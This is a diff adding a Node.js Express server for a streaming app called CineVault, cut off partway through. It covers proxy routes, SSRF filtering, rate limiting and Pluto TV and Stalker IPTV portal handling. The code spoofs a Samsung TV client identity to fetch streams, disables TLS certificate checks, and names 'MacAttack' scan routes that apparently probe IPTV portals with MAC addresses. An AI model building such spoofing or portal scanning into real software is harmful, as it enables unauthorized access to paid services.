@@ -1,0 +1,7333 @@
+// ── CineVault Node.js Server ──
+// Express static server + CORS proxy + streaming proxy + cover art search + movie logs
+const express = require('express');
+const fetch = require('node-fetch');
+const path = require('path');
+const fs = require('fs');
+const crypto = require('crypto');
+const os = require('os');
+const https = require('https');
+const dns = require('dns').promises;
+const { spawn, spawnSync } = require('child_process');
+const { HttpsProxyAgent } = require('https-proxy-agent');
+const { HttpProxyAgent } = require('http-proxy-agent');
+const compression = require('compression');
+// Lenient HTTPS agent for IPTV streams with expired/self-signed certs
+const lenientHttpsAgent = new https.Agent({ rejectUnauthorized: false });
+const PLUTO_WEB_UA = 'Mozilla/5.0 (X11; Linux x86_64; rv:126.0) Gecko/20100101 Firefox/126.0';
+let plutoAppVersionCache = { value: '', ts: 0 };
+
+// ── SSRF Protection: Block private/internal URLs ──
+function isUrlAllowed(urlStr) {
+  let parsed;
+  try { parsed = new URL(urlStr); } catch { return false; } // invalid URL = block
+  // Only allow http/https (blocks file://, ftp://, data://, etc.)
+  if (parsed.protocol !== 'http:' && parsed.protocol !== 'https:') return false;
+  const hostname = parsed.hostname;
+  if (!hostname) return false;
+  // IPv4 private ranges
+  const v4Match = hostname.match(/^(\d{1,3})\.(\d{1,3})\.(\d{1,3})\.(\d{1,3})$/);
+  if (v4Match) {
+    const [, a, b, c, d] = v4Match.map(Number);
+    if (a === 127) return false;              // 127.0.0.0/8
+    if (a === 10) return false;               // 10.0.0.0/8
+    if (a === 172 && b >= 16 && b <= 31) return false; // 172.16.0.0/12
+    if (a === 192 && b === 168) return false;  // 192.168.0.0/16
+    if (a === 169 && b === 254) return false;  // 169.254.0.0/16
+    if (a === 0) return false;                 // 0.0.0.0/8
+  }
+  // IPv6 loopback and private
+  if (hostname === '::1' || hostname === '[::1]') return false;
+  if (hostname.startsWith('fc') || hostname.startsWith('FC')) return false; // fc00::/7
+  if (hostname.startsWith('fd') || hostname.startsWith('FD')) return false; // fd00::/8 (subset of fc00::/7)
+  // Block hostnames that look like internal names
+  if (hostname === 'localhost' || hostname.endsWith('.localhost')) return false;
+  if (hostname.endsWith('.local') || hostname.endsWith('.internal')) return false;
+  return true;
+}
+
+function resolvePlaylistUrl(uri, playlistUrl) {
+  try {
+    return new URL(uri, playlistUrl).href;
+  } catch {
+    return uri;
+  }
+}
+
+function rewriteM3U8Playlist(body, playlistUrl, proxyPath) {
+  const proxyUrl = (url) => {
+    const finalUrl = /(?:pluto\.tv|plutotv\.net)/i.test(url) ? normalizePlutoUrl(url) : url;
+    return `${proxyPath}?url=${encodeURIComponent(finalUrl)}`;
+  };
+
+  return body.split('\n').map((line) => {
+    let rewritten = line.replace(/URI="([^"]+)"/g, (match, uri) => {
+      if (/^(data|blob|skd):/i.test(uri)) return match;
+      return `URI="${proxyUrl(resolvePlaylistUrl(uri, playlistUrl))}"`;
+    });
+
+    const trimmed = rewritten.trim();
+    if (!trimmed || trimmed.startsWith('#')) return rewritten;
+    if (/^[a-z][a-z0-9+.-]*:/i.test(trimmed) && !/^https?:/i.test(trimmed)) return rewritten;
+
+    return rewritten.replace(trimmed, proxyUrl(resolvePlaylistUrl(trimmed, playlistUrl)));
+  }).join('\n');
+}
+
+function plutoParams() {
+  const sid = crypto.randomUUID ? crypto.randomUUID() : crypto.randomBytes(16).toString('hex');
+  const deviceId = crypto.randomUUID ? crypto.randomUUID() : crypto.randomBytes(16).toString('hex');
+  return new URLSearchParams({
+    deviceType: 'samsung-tvplus',
+    deviceDNT: '0',
+    deviceModel: '16_new_samsungtv',
+    deviceVersion: '3.047.0.0',
+    appVersion: '3.047.0.0',
+    appName: 'samsung-tvplus',
+    architecture: 'x86',
+    buildVersion: '3.047.0.0',
+    clientTime: String(Math.floor(Date.now() / 1000)),
+    deviceLat: '34.0522',
+    deviceLon: '-118.2437',
+    deviceMake: 'samsung',
+    deviceId,
+    clientID: deviceId,
+    includeExtendedEvents: 'false',
+    marketingRegion: 'US',
+    sid,
+    userId: '',
+  }).toString();
+}
+
+function isPlutoWebStitcherUrl(url) {
+  return /(?:pluto\.tv|plutotv\.net)/i.test(String(url || '')) &&
+    (/\/v2\/stitch\//i.test(String(url || '')) || /[?&](jwt|masterJWTPassthrough)=/i.test(String(url || '')));
+}
+
+function normalizePlutoUrl(url) {
+  const raw = String(url || '');
+  try {
+    const parsed = new URL(raw);
+    parsed.searchParams.delete('includeDeviceUA');
+    parsed.searchParams.set('deviceType', 'samsung-tvplus');
+    parsed.searchParams.set('deviceDNT', '0');
+    parsed.searchParams.set('deviceModel', '16_new_samsungtv');
+    parsed.searchParams.set('deviceVersion', '3.047.0.0');
+    parsed.searchParams.set('appVersion', '3.047.0.0');
+    parsed.searchParams.set('appName', 'samsung-tvplus');
+    parsed.searchParams.set('architecture', 'x86');
+    parsed.searchParams.set('buildVersion', '3.047.0.0');
+    parsed.searchParams.set('deviceMake', 'samsung');
+    parsed.searchParams.set('marketingRegion', 'US');
+    parsed.searchParams.set('includeExtendedEvents', 'false');
+    parsed.searchParams.set('clientTime', String(Math.floor(Date.now() / 1000)));
+    if (!parsed.searchParams.get('deviceLat')) parsed.searchParams.set('deviceLat', '34.0522');
+    if (!parsed.searchParams.get('deviceLon')) parsed.searchParams.set('deviceLon', '-118.2437');
+    if (!parsed.searchParams.get('sid') || parsed.searchParams.get('sid') === 'unknown') {
+      parsed.searchParams.set('sid', crypto.randomUUID ? crypto.randomUUID() : crypto.randomBytes(16).toString('hex'));
+    }
+    const deviceId = parsed.searchParams.get('deviceId');
+    if (!deviceId || deviceId === 'unknown') {
+      parsed.searchParams.set('deviceId', crypto.randomUUID ? crypto.randomUUID() : crypto.randomBytes(16).toString('hex'));
+    }
+    const clientID = parsed.searchParams.get('clientID');
+    if (!clientID || clientID === 'unknown') parsed.searchParams.set('clientID', parsed.searchParams.get('deviceId'));
+    return parsed.href;
+  } catch {
+    return raw
+      .replace(/([?&])includeDeviceUA=true(&?)/g, (_, pre, post) => post ? pre : '')
+      .replace(/([?&])deviceType=web(?=&|$)/g, '$1deviceType=samsung-tvplus');
+  }
+}
+
+async function getPlutoAppVersion() {
+  if (plutoAppVersionCache.value && Date.now() - plutoAppVersionCache.ts < 6 * 60 * 60 * 1000) {
+    return plutoAppVersionCache.value;
+  }
+  const page = await fetch('https://pluto.tv/live-tv', {
+    headers: { 'User-Agent': PLUTO_WEB_UA, 'Accept': 'text/html,*/*' },
+    signal: AbortSignal.timeout(10000),
+  }).then(r => r.text());
+  const appVersion = page.match(/<meta[^>]+name=["']appVersion["'][^>]+content=["']([^"']+)/i)?.[1];
+  if (!appVersion) throw new Error('Could not find Pluto app version');
+  plutoAppVersionCache = { value: appVersion, ts: Date.now() };
+  return appVersion;
+}
+
+async function getPlutoWebStreamUrl(channelId) {
+  const cleanChannelId = String(channelId || '').trim();
+  if (!/^[a-z0-9-]+$/i.test(cleanChannelId)) throw new Error('Invalid Pluto channel id');
+
+  const clientID = crypto.randomUUID ? crypto.randomUUID() : crypto.randomBytes(16).toString('hex');
+  const appVersion = await getPlutoAppVersion();
+  const params = new URLSearchParams({
+    appName: 'web',
+    appVersion,
+    deviceVersion: '126.0',
+    deviceModel: 'web',
+    deviceMake: 'firefox',
+    deviceType: 'web',
+    clientID,
+    clientModelNumber: '1.0.0',
+    serverSideAds: 'false',
+    channelSlug: cleanChannelId,
+  });
+
+  const boot = await fetch(`https://boot.pluto.tv/v4/start?${params}`, {
+    headers: { 'User-Agent': PLUTO_WEB_UA, 'Accept': 'application/json' },
+    signal: AbortSignal.timeout(10000),
+  }).then(async r => {
+    if (!r.ok) throw new Error(`Pluto bootstrap returned ${r.status}`);
+    return r.json();
+  });
+
+  const media = (boot.EPG || []).find(ch => ch.id === cleanChannelId || ch.slug === cleanChannelId);
+  const stitchedPath = media?.stitched?.path || media?.stitched?.paths?.find(p => p.type === 'hls')?.path;
+  if (!boot.servers?.stitcher || !boot.stitcherParams || !boot.sessionToken || !stitchedPath) {
+    throw new Error('Pluto bootstrap did not return a playable HLS stream');
+  }
+
+  const streamParams = new URLSearchParams(boot.stitcherParams);
+  streamParams.set('jwt', boot.sessionToken);
+  streamParams.set('includeExtendedEvents', 'true');
+  streamParams.set('masterJWTPassthrough', 'true');
+
+  return `${boot.servers.stitcher}/v2${stitchedPath}?${streamParams}`;
+}
+
+const app = express();
+const PORT = process.env.PORT || 8080;
+const MACATTACK_INTRO_FILE = fs.existsSync('/home/ghost/MacAttack/include/intro.mp4')
+  ? '/home/ghost/MacAttack/include/intro.mp4'
+  : path.join(__dirname, 'assets', 'macattack', 'intro.mp4');
+
+function resolveStalkerPortal(inputUrl) {
+  const original = String(inputUrl || '').trim();
+  let clean = original.replace(/\/+$/, '');
+  if (!clean) return { original, hostBase: '', apiUrl: '', style: 'unknown' };
+
+  if (clean.includes('/stalker_portal/server/load.php')) {
+    const hostBase = clean.replace(/\/stalker_portal\/server\/load\.php.*$/, '');
+    return { original, hostBase, apiUrl: `${hostBase}/stalker_portal/server/load.php`, style: 'stalker' };
+  }
+
+  if (clean.includes('/stalker_portal')) {
+    const hostBase = clean.replace(/\/stalker_portal.*$/, '');
+    return { original, hostBase, apiUrl: `${hostBase}/stalker_portal/server/load.php`, style: 'stalker' };
+  }
+
+  if (clean.includes('/c/portal.php') || clean.endsWith('/c/portal.php')) {
+    const hostBase = clean.replace(/\/c\/portal\.php.*$/, '');
+    return { original, hostBase, apiUrl: `${hostBase}/c/portal.php`, style: 'portal' };
+  }
+
+  if (clean.endsWith('/c') || clean.endsWith('/c/')) {
+    clean = clean.replace(/\/+$/, '');
+    const hostBase = clean.replace(/\/c$/, '');
+    return { original, hostBase, apiUrl: `${hostBase}/c/portal.php`, style: 'portal' };
+  }
+
+  if (clean.includes('/portal.php')) {
+    const hostBase = clean.replace(/\/portal\.php.*$/, '');
+    return { original, hostBase, apiUrl: `${hostBase}/portal.php`, style: 'portal' };
+  }
+
+  if (/streamtv\.to/i.test(clean)) {
+    // streamtv.to uses /server/load.php not /c/portal.php for the API
+    const hostBase = clean.replace(/\/c\/?$/, '');
+    return { original, hostBase, apiUrl: `${hostBase}/server/load.php`, style: 'stalker' };
+  }
+
+  return { original, hostBase: clean, apiUrl: `${clean}/stalker_portal/server/load.php`, style: 'stalker' };
+}
+
+function resolveMacAttackPortalEndpoint(inputUrl, type) {
+  const resolved = resolveStalkerPortal(inputUrl);
+  if (type && type !== 'Autodetect') {
+    const hostBase = resolved.hostBase || String(inputUrl || '').replace(/\/(?:c|stalker_portal.*|portal\.php).*$/i, '').replace(/\/+$/, '');
+    if (String(type).toLowerCase().includes('stalker')) {
+      return { ...resolved, hostBase, apiUrl: `${hostBase}/stalker_portal/server/load.php`, style: 'stalker' };
+    }
+    return { ...resolved, hostBase, apiUrl: `${hostBase}/c/portal.php`, style: 'portal' };
+  }
+  return resolved;
+}
+
+// ── Movie Logs ──
+const LOGS_FILE = path.join(__dirname, 'data', 'movie_logs.json');
+
+function ensureDataDir() {
+  const dir = path.join(__dirname, 'data');
+  if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
+  if (!fs.existsSync(LOGS_FILE)) fs.writeFileSync(LOGS_FILE, '[]', 'utf8');
+}
+
+function readLogs() {
+  try { return JSON.parse(fs.readFileSync(LOGS_FILE, 'utf8')); }
+  catch { return []; }
+}
+
+function writeLogs(logs) {
+  fs.writeFileSync(LOGS_FILE, JSON.stringify(logs, null, 2), 'utf8');
+}
+
+// ── Middleware ──
+app.use(express.json({ limit: '2mb' }));
+app.use(express.urlencoded({ extended: true }));
+app.use(compression());
+
+app.get('/assets/macattack/intro.mp4', (req, res) => {
+  if (!fs.existsSync(MACATTACK_INTRO_FILE)) {
+    return res.status(404).end('MacAttack intro not found');
+  }
+  res.sendFile(MACATTACK_INTRO_FILE);
+});
+
+// CORS headers for all API routes — reflect request Origin (not wildcard '*')
+// CORS Origin whitelist — only allow specific origins
+function isOriginAllowed(origin) {
+  if (!origin) return true; // no Origin header (server-to-server, curl, etc.)
+  try {
+    const hostname = new URL(origin).hostname;
+    if (hostname === 'localhost' || hostname === '127.0.0.1') return true;
+    if (hostname.endsWith('.phantomide.com') || hostname === 'phantomide.com') return true;
+    if (hostname.endsWith('.serveousercontent.com') || hostname === 'serveousercontent.com') return true;
+    if (hostname.endsWith('.lhr.life') || hostname === 'lhr.life') return true;
+    return false;
+  } catch { return false; }
+}
+
+function getAllowedOrigin(req) {
+  const origin = req.headers.origin;
+  if (!origin) return 'http://localhost:8080';
+  if (isOriginAllowed(origin)) return origin;
+  return ''; // Disallowed origins get empty ACAO (browser blocks response)
+}
+
+app.use('/api', (req, res, next) => {
+  const origin = getAllowedOrigin(req);
+  if (origin) {
+    res.header('Access-Control-Allow-Origin', origin);
+    res.header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
+    res.header('Access-Control-Allow-Headers', 'Content-Type, Authorization, Cookie, User-Agent');
+    res.header('Vary', 'Origin');
+  }
+  // NOTE: Access-Control-Allow-Credentials removed from global CORS;
+  // stalker endpoints set their own Allow-Credentials per-route only when origin is whitelisted
+  if (req.method === 'OPTIONS') return res.sendStatus(204);
+  next();
+});
+
+// ── In-Memory Rate Limiter (no external deps) ──
+const rateLimitStore = new Map(); // ip -> { count, windowStart }
+const PROXY_RATE_LIMIT = 60;   // 60 req/min for proxy endpoints
+const API_RATE_LIMIT = 300;    // 300 req/min for other API endpoints
+const RATE_WINDOW_MS = 60 * 1000; // 1-minute window
+
+function rateLimiter(maxPerMin) {
+  return (req, res, next) => {
+    const ip = req.ip || req.connection?.remoteAddress || 'unknown';
+    const now = Date.now();
+    let entry = rateLimitStore.get(ip);
+    if (!entry || now - entry.windowStart > RATE_WINDOW_MS) {
+      entry = { count: 1, windowStart: now };
+      rateLimitStore.set(ip, entry);
+      return next();
+    }
+    entry.count++;
+    if (entry.count > maxPerMin) {
+      res.set('Retry-After', String(Math.ceil((RATE_WINDOW_MS - (now - entry.windowStart)) / 1000)));
+      return res.status(429).json({ error: 'Too many requests', retryAfter: Math.ceil((RATE_WINDOW_MS - (now - entry.windowStart)) / 1000) + 's' });
+    }
+    next();
+  };
+}
+
+// Evict stale rate limit entries periodically (every 2 min)
+setInterval(() => {
+  const now = Date.now();
+  for (const [ip, entry] of rateLimitStore) {
+    if (now - entry.windowStart > RATE_WINDOW_MS * 2) rateLimitStore.delete(ip);
+  }
+}, 120000);
+
+// Apply proxy rate limit to the 4 proxy endpoints
+app.use('/api/proxy', rateLimiter(PROXY_RATE_LIMIT));
+app.use('/api/embed-proxy', rateLimiter(PROXY_RATE_LIMIT));
+app.use('/api/stalker-proxy', rateLimiter(PROXY_RATE_LIMIT));
+app.use('/api/stalker-stream', rateLimiter(PROXY_RATE_LIMIT));
+app.use('/api/tvpass-stream', rateLimiter(PROXY_RATE_LIMIT));
+app.use('/api/hls-proxy', rateLimiter(5000));
+app.use('/api/transcode', rateLimiter(PROXY_RATE_LIMIT));
+app.use('/api/stream-proxy', rateLimiter(PROXY_RATE_LIMIT));
+// Exempt macaction scan/SSE routes from rate limiting (scan is long-running, SSE is keep-alive)
+app.use('/api/macaction/scan', (req, res, next) => { req._skipRateLimit = true; next(); });
+app.use('/api/macaction/scan-events', (req, res, next) => { req._skipRateLimit = true; next(); });
+app.use('/api/macaction/scan-results', (req, res, next) => { req._skipRateLimit = true; next(); });
+app.use('/api/macaction/stop-scan', (req, res, next) => { req._skipRateLimit = true; next(); });
+app.use('/api/macaction/proxies', (req, res, next) => { req._skipRateLimit = true; next(); });
+app.use('/api/cover-bank', (req, res, next) => { req._skipRateLimit = true; next(); });
+app.use('/api/archive-search', (req, res, next) => { req._skipRateLimit = true; next(); });
+app.use('/api/stalker-channels', (req, res, next) => { req._skipRateLimit = true; next(); });
+app.use('/api/stalker-hls', (req, res, next) => { req._skipRateLimit = true; next(); });
+
+// ── Per-IP Stream Tracker (fair bandwidth sharing across devices) ──
+const streamTracker = new Map(); // ip -> { active: [{ url, startTime, type }], totalStarted: number }
+const MAX_STREAMS_PER_IP = 4; // max concurrent streams per device
+setInterval(() => {
+  // Evict stale entries (no active streams for 5 min)
+  for (const [ip, entry] of streamTracker) {
+    if (entry.active.length === 0 && Date.now() - entry.lastActive > 5 * 60 * 1000) {
+      streamTracker.delete(ip);
+    }
+  }
+}, 60 * 1000);
+
+function trackStreamStart(ip, url, type) {
+  let entry = streamTracker.get(ip);
+  if (!entry) { entry = { active: [], totalStarted: 0, lastActive: Date.now() }; streamTracker.set(ip, entry); }
+  entry.active.push({ url, startTime: Date.now(), type });
+  entry.totalStarted++;
+  entry.lastActive = Date.now();
+}
+function trackStreamEnd(ip, url) {
+  const entry = streamTracker.get(ip);
+  if (!entry) return;
+  entry.active = entry.active.filter(s => s.url !== url);
+  entry.lastActive = Date.now();
+}
+
+// ── System Health Endpoint (CPU, GPU, memory, active streams) ──
+// ── Cached GPU info (set once at startup, avoids spawning lspci on every /api/health call) ──
+let _cachedGpuInfo = null;
+try {
+  _cachedGpuInfo = require('child_process').execSync('lspci 2>/dev/null | grep -i "vga\\|3d\\|display"', { timeout: 3000 }).toString().trim() || 'N/A';
+} catch { _cachedGpuInfo = 'N/A'; }
+
+// ── Background CPU sampler — reads /proc/stat every 2s, always fresh ──
+let _lastCpuPct = 0;
+let _cpuRead1 = null;
+function readProcStat() {
+  try {
+    const line = require('fs').readFileSync('/proc/stat', 'utf8').split('\n')[0];
+    const nums = line.split(/\s+/).slice(1).map(Number);
+    return { idle: nums[3], total: nums.reduce((a, b) => a + b, 0) };
+  } catch { return null; }
+}
+_cpuRead1 = readProcStat();
+setInterval(() => {
+  const r2 = readProcStat();
+  if (_cpuRead1 && r2 && r2.total > _cpuRead1.total) {
+    const diff = r2.total - _cpuRead1.total;
+    const idle = r2.idle - _cpuRead1.idle;
+    _lastCpuPct = Math.round(((diff - idle) / diff) * 100);
+  }
+  _cpuRead1 = r2;
+}, 2000);
+
+app.get('/api/health', (req, res) => {
+  const cpus = os.cpus();
+  const totalMem = os.totalmem();
+  const freeMem = os.freemem();
+  const loadAvg = os.loadavg();
+  const uptimeSecs = os.uptime();
+  const cpuUsagePct = _lastCpuPct;
+  const memUsagePct = Math.round(((totalMem - freeMem) / totalMem) * 100);
+
+  // Active streams per IP
+    const activeStreams = {};
+    for (const [ip, entry] of streamTracker) {
+      if (entry.active.length > 0) {
+        activeStreams[ip] = {
+          count: entry.active.length,
+          types: [...new Set(entry.active.map(s => s.type))],
+          streams: entry.active.map(s => ({ type: s.type, duration: Math.round((Date.now() - s.startTime) / 1000) + 's' }))
+        };
+      }
+    }
+
+    res.json({
+      status: 'ok',
+      cpu: {
+        model: cpus[0]?.model || 'unknown',
+        cores: cpus.length,
+        usagePct: cpuUsagePct,
+        loadAvg: loadAvg.map(l => Math.round(l * 100) / 100)
+      },
+      gpu: _cachedGpuInfo,
+      memory: {
+        total: Math.round(totalMem / 1024 / 1024) + 'MB',
+        free: Math.round(freeMem / 1024 / 1024) + 'MB',
+        used: Math.round((totalMem - freeMem) / 1024 / 1024) + 'MB',
+        usagePct: memUsagePct
+      },
+      uptime: Math.round(uptimeSecs / 3600) + 'h',
+      streams: {
+        activeIPs: Object.keys(activeStreams).length,
+        activeTotal: Object.values(activeStreams).reduce((sum, v) => sum + v.count, 0),
+        perIP: activeStreams
+      },
+      // Advise frontend on quality based on system load
+      qualityHint: cpuUsagePct > 85 ? 'low' : cpuUsagePct > 60 ? 'medium' : 'high'
+    });
+  });
+// ── Shared session pool status (for debugging multi-device) ──
+app.get('/api/pool-status', (req, res) => {
+  const entries = [];
+  for (const [key, val] of sharedStalkerSessions) {
+    entries.push({ key: key.substring(0, 80), sessionId: val.sessionId, refCount: val.refCount, clients: [...val.clients], lastAccess: val.lastAccess, alive: activeTranscodes.has(val.sessionId) });
+  }
+  res.json({ poolSize: sharedStalkerSessions.size, entries });
+});
+app.use('/api/pluto-channels', (req, res, next) => { req._skipRateLimit = true; next(); });
+app.use('/api/pluto-stream', (req, res, next) => { req._skipRateLimit = true; next(); });
+app.use('/api/iptv-org', (req, res, next) => { req._skipRateLimit = true; next(); });
+app.use('/api/tubi-channels', (req, res, next) => { req._skipRateLimit = true; next(); });
+app.use('/api/tubi-stream', (req, res, next) => { req._skipRateLimit = true; next(); });
+app.use('/api/tunnel-url', (req, res, next) => { req._skipRateLimit = true; next(); });
+// Apply general API rate limit to remaining /api routes (skip exempted)
+app.use('/api', (req, res, next) => {
+  if (req._skipRateLimit) return next();
+  rateLimiter(API_RATE_LIMIT)(req, res, next);
+});
+
+// Cache for API responses (in-memory, 30 min TTL)
+const apiCache = new Map();
+const CACHE_TTL = 30 * 60 * 1000;
+const CACHE_TTL_2H = 2 * 60 * 60 * 1000;
+const CACHE_TTL_24H = 24 * 60 * 60 * 1000;
+
+// Persistent Cinemeta disk cache — survives server restarts
+const CINEMETA_CACHE_FILE = path.join(__dirname, 'data', 'cinemeta-cache.json');
+let _cinemetaDiskCache = null;
+function loadCinemetaDiskCache() {
+  if (_cinemetaDiskCache) return _cinemetaDiskCache;
+  try { _cinemetaDiskCache = JSON.parse(fs.readFileSync(CINEMETA_CACHE_FILE, 'utf8')); }
+  catch { _cinemetaDiskCache = {}; }
+  return _cinemetaDiskCache;
+}
+function saveCinemetaDiskCache(key, data) {
+  const cache = loadCinemetaDiskCache();
+  cache[key] = { data, ts: Date.now() };
+  // Keep cache from growing unbounded — evict entries older than 7 days
+  const cutoff = Date.now() - 7 * 24 * 60 * 60 * 1000;
+  for (const k of Object.keys(cache)) { if (cache[k].ts < cutoff) delete cache[k]; }
+  try { fs.writeFileSync(CINEMETA_CACHE_FILE, JSON.stringify(cache), 'utf8'); } catch {}
+}
+function getCinemetaDiskCached(key) {
+  const cache = loadCinemetaDiskCache();
+  const entry = cache[key];
+  if (entry && Date.now() - entry.ts < CACHE_TTL_24H) return entry.data;
+  return null;
+}
+
+function getCached(key) {
+  const entry = apiCache.get(key);
+  if (entry && Date.now() - entry.ts < CACHE_TTL) return entry.data;
+  apiCache.delete(key);
+  return null;
+}
+
+function setCache(key, data) {
+  apiCache.set(key, { data, ts: Date.now() });
+  // Evict old entries when cache gets large
+  if (apiCache.size > 500) {
+    const oldest = [...apiCache.entries()].sort((a, b) => a[1].ts - b[1].ts);
+    for (let i = 0; i < 50; i++) apiCache.delete(oldest[i][0]);
+  }
+}
+
+// ═══════════════════════════════════════════
+//  /api/proxy — CORS-bypassed URL fetcher
+//  ?url=<encoded URL>
+//  Supports TMDB, OMDb, Cinemeta, images, etc.
+// ═══════════════════════════════════════════
+app.get('/api/proxy', async (req, res) => {
+  const targetUrl = req.query.url;
+  if (!targetUrl) return res.status(400).json({ error: 'Missing ?url= parameter' });
+  if (!isUrlAllowed(targetUrl)) return res.status(403).json({ error: 'Blocked: URL targets private/internal network' });
+
+  // Check cache first
+  const cacheKey = `proxy:${targetUrl}`;
+  const cached = getCached(cacheKey);
+  if (cached) {
+    res.set(cached.headers);
+    return res.send(cached.body);
+  }
+
+  try {
+    const controller = new AbortController();
+    const timeout = setTimeout(() => controller.abort(), 30000);
+
+    const upstream = await fetch(targetUrl, {
+      signal: controller.signal,
+      headers: {
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
+        'Accept': req.headers.accept || '*/*',
+        'Accept-Language': 'en-US,en;q=0.9',
+        // NOTE: cookie forwarding removed — never forward user cookies to arbitrary upstream URLs
+      },
+      redirect: 'follow',
+    });
+    clearTimeout(timeout);
+
+    const contentType = upstream.headers.get('content-type') || '';
+    const body = await upstream.buffer();
+
+    const origin = getAllowedOrigin(req);
+    const headers = {
+      'Content-Type': contentType,
+      'Access-Control-Allow-Origin': origin,
+      'Vary': 'Origin',
+      'Cache-Control': 'public, max-age=3600',
+    };
+    res.set(headers);
+    res.send(body);
+
+    // Cache smaller responses only
+    if (body.length < 500000) {
+      setCache(cacheKey, { headers, body: body.toString('base64') });
+    }
+  } catch (err) {
+    console.error(`[PROXY] Error fetching ${targetUrl}: ${err.message}`);
+    res.status(502).json({ error: 'Proxy fetch failed', detail: 'Request failed' });
+  }
+});
+
+// ═══════════════════════════════════════════════════════════════
+//  /api/hls-proxy — Streaming HLS proxy with header injection
+//  Pipes response through (no buffering) for smooth video playback
+//  ?url=<encoded m3u8/segment URL>
+// ═══════════════════════════════════════════════════════════════
+app.get('/api/hls-proxy', (req, res) => {
+  let targetUrl = req.query.url;
+  if (!targetUrl) return res.status(400).json({ error: 'Missing ?url= parameter' });
+  if (/(?:pluto\.tv|plutotv\.net)/i.test(targetUrl) && !isPlutoWebStitcherUrl(targetUrl)) targetUrl = normalizePlutoUrl(targetUrl);
+  if (!isUrlAllowed(targetUrl)) return res.status(403).json({ error: 'Blocked: URL targets private/internal network' });
+
+  // Track stream for multi-device monitoring
+  const hIp = req.ip || req.connection?.remoteAddress || 'unknown';
+  const hId = `${hIp}:hls-proxy:${targetUrl.slice(0,40)}`;
+  trackStreamStart(hIp, hId, 'hls-proxy');
+  res.on('close', () => trackStreamEnd(hIp, hId));
+  res.on('finish', () => trackStreamEnd(hIp, hId));
+
+  const { http: fHttp, https: fHttps } = require('follow-redirects');
+  const parsed = new URL(targetUrl);
+  const requester = parsed.protocol === 'https:' ? fHttps : fHttp;
+
+  const proxyHeaders = {
+    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
+    'Referer': `${req.protocol || 'http'}://${req.headers.host || 'localhost:8081'}/`,
+    'Origin': `${req.protocol || 'http'}://${req.headers.host || 'localhost:8081'}`,
+    'Accept': req.headers.accept || '*/*',
+    'Accept-Encoding': 'identity',
+    'Accept-Language': 'en-US,en;q=0.9',
+  };
+  // Pluto TV requires device headers for sub-playlists and segments
+  if (targetUrl.includes('pluto.tv') || targetUrl.includes('plutotv.net')) {
+    proxyHeaders['User-Agent'] = PLUTO_WEB_UA;
+    proxyHeaders['plutotv-device-dnt'] = '0';
+    proxyHeaders['plutotv-device-model'] = '16_new_samsungtv';
+    proxyHeaders['plutotv-device-version'] = '3.047.0.0';
+    proxyHeaders['plutotv-app-name'] = 'samsung-tvplus';
+    proxyHeaders['plutotv-app-version'] = '3.047.0.0';
+    proxyHeaders['plutotv-device-type'] = 'samsung-tvplus';
+    proxyHeaders['plutotv-device-make'] = 'samsung';
+  }
+
+  let destroyed = false;
+  req.on('close', () => { destroyed = true; upstreamReq.destroy(); });
+
+  const upstreamReq = requester.get(targetUrl, { headers: proxyHeaders, timeout: 15000 }, (upstreamRes) => {
+    const cType = (upstreamRes.headers['content-type'] || '').toLowerCase();
+    const isM3U8 = cType.includes('mpegurl') || cType.includes('vnd.apple') || targetUrl.includes('.m3u8');
+
+    if (isM3U8) {
+      // Buffer M3U8 playlists and rewrite URLs to proxy through us
+      const chunks = [];
+      upstreamRes.on('data', chunk => chunks.push(chunk));
+      upstreamRes.on('end', () => {
+        if (destroyed || res.headersSent) return;
+        let body = Buffer.concat(chunks).toString('utf8');
+        body = rewriteM3U8Playlist(body, targetUrl, '/api/hls-proxy');
+        res.writeHead(upstreamRes.statusCode, {
+          'Content-Type': cType || 'application/vnd.apple.mpegurl',
+          'Access-Control-Allow-Origin': getAllowedOrigin(req),
+          'Cache-Control': 'no-cache',
+          'Vary': 'Origin',
+        });
+        res.end(body);
+      });
+    } else {
+      // Pipe raw binary data (TS segments, etc.) straight through
+      res.writeHead(upstreamRes.statusCode, {
+        'Content-Type': cType || 'application/octet-stream',
+        'Access-Control-Allow-Origin': getAllowedOrigin(req),
+        'Cache-Control': 'public, max-age=3600',
+        'Vary': 'Origin',
+      });
+      upstreamRes.pipe(res);
+    }
+  });
+
+  upstreamReq.on('error', (err) => {
+    console.error(`[HLS-PROXY] Error fetching ${targetUrl.substring(0,80)}: ${err.message}`);
+    if (!res.headersSent) res.status(502).json({ error: 'Proxy fetch failed', detail: err.message });
+  });
+
+  upstreamReq.on('timeout', () => {
+    upstreamReq.destroy();
+    if (!res.headersSent) res.status(504).json({ error: 'Upstream timeout' });
+  });
+});
+
+// ═══════════════════════════════════════════════════════════════
+//  /api/transcode — ffmpeg HLS transcoding proxy
+//  Fetches remote stream, transcodes to H.264+AAC HLS, serves locally
+//  ?url=<encoded stream URL> [&bitrate=2000k] [&abitrate=128k]
+// ═══════════════════════════════════════════════════════════════
+
+// Track active transcode sessions for cleanup
+const activeTranscodes = new Map();
+// Cache stalker tokens per MAC — tokens last ~10min on most portals
+const stalkerTokenCache = new Map(); // key: `${base}:${mac}` → { token, cookieBase, ts }
+
+app.get('/api/transcode/master.m3u8', (req, res) => {
+  const targetUrl = req.query.url;
+  if (!targetUrl) return res.status(400).json({ error: 'Missing ?url= parameter' });
+  if (!isUrlAllowed(targetUrl)) return res.status(403).json({ error: 'Blocked: URL targets private/internal network' });
+
+  const sessionId = crypto.randomBytes(8).toString('hex');
+  const tmpDir = path.join(os.tmpdir(), `cinevault-tc-${sessionId}`);
+  fs.mkdirSync(tmpDir, { recursive: true });
+
+  const bitrate = req.query.bitrate || '2500k';
+  const audioBitrate = req.query.abitrate || '128k';
+
+  console.log(`[TRANSCODE] Session ${sessionId}: ${targetUrl.substring(0,80)} → H.264 @${bitrate}`);
+
+  // Build ffmpeg args — transcode to H.264+AAC HLS
+  const ffmpegArgs = [
+    '-timeout', '10000000',             // 10s connect timeout (nanoseconds for ffmpeg)
+    '-reconnect', '1',                  // reconnect on network error
+    '-reconnect_streamed', '1',
+    '-reconnect_delay_max', '10',        // max 10s between reconnect attempts
+    '-reconnect_on_network_error', '1',
